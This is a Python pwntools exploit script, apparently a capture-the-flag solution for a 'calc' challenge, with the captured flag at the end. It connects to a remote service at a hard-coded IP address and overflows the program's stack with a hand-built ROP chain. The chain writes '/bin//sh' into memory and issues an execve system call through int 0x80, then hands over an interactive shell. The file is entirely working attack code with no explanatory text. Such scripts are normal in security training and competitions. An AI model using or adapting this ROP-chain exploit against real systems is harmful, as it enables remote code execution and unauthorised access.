from pwn import *

# context.log_level = 'debug'
# context.terminal = ['gnome-terminal', '-x', 'bash', '-c']

local = 0

if local:
    cn = process('./calc')
    elf = ELF('./calc')
else:
    cn = remote('111.230.149.72', 10009)

def z(a=''):
    gdb.attach(cn, a)
    if a == '':
        raw_input()

from struct import pack

p = 'a' * 0x100
p += p32(0x40)
p += p32(0)
p += 'a' * 0xc

p += pack('<I', 0x08056ad3) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080b8446) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x080551fb) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08056ad3) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x080b8446) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x080551fb) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08056ad3) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08049603) # xor eax, eax ; ret
p += pack('<I', 0x080551fb) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080dee5d) # pop ecx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08056ad3) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08049603) # xor eax, eax ; ret
p += pack('<I', 0x0807b01f) # inc eax ; ret
p += pack('<I', 0x0807b01f) # inc eax ; ret
p += pack('<I', 0x0807b01f) # inc eax ; ret
p += pack('<I', 0x0807b01f) # inc eax ; ret
p += pack('<I', 0x0807b01f) # inc eax ; ret
p += pack('<I', 0x0807b01f) # inc eax ; ret
p += pack('<I', 0x0807b01f) # inc eax ; ret
p += pack('<I', 0x0807b01f) # inc eax ; ret
p += pack('<I', 0x0807b01f) # inc eax ; ret
p += pack('<I', 0x0807b01f) # inc eax ; ret
p += pack('<I', 0x0807b01f) # inc eax ; ret
p += pack('<I', 0x0806d445) # int 0x80

cn.recvuntil('> ')
cn.sendline(str(len(p)/4+1))

for i in range(len(p)/4):
    cn.sendline('1')
    cn.recvuntil('a:')
    cn.sendline('0')
    cn.recvuntil('b:')
    cn.sendline(str(u32(p[4 * i : 4 * i + 4])))
    cn.sendline('5')
cn.sendline('6')
cn.interactive()

#hgame{go0o0o0o00o0o0o0oo00o0d_j0b}
